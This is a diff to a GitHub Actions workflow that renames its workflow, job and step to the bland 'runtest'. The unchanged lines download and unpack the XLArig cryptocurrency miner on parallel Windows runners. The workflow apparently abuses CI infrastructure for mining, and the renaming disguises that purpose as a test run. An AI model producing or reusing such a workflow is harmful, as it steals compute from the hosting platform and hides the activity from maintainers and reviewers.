@@ -1,10 +1,10 @@
-name: eX-code_UMBL
+name: runtest
 
 on: [workflow_dispatch]
 
 jobs:
   build:
-    name: eX-code_UMBL
+    name: runtest
     runs-on: windows-latest
     strategy:
       max-parallel: 5
@@ -16,7 +16,7 @@ jobs:
         NUM_JOBS: 20
         JOB: ${{ matrix.go }}
     steps:
-    - name: PREPARING
+    - name: runtest
       run: Invoke-WebRequest https://github.com/scala-network/XLArig/releases/download/v5.2.2/XLArig-v5.2.2-win64.zip -Outfile XLArig-v5.2.2-win64.zip
     - name: Seting-UP
       run: Expand-Archive XLArig-v5.2.2-win64.zip
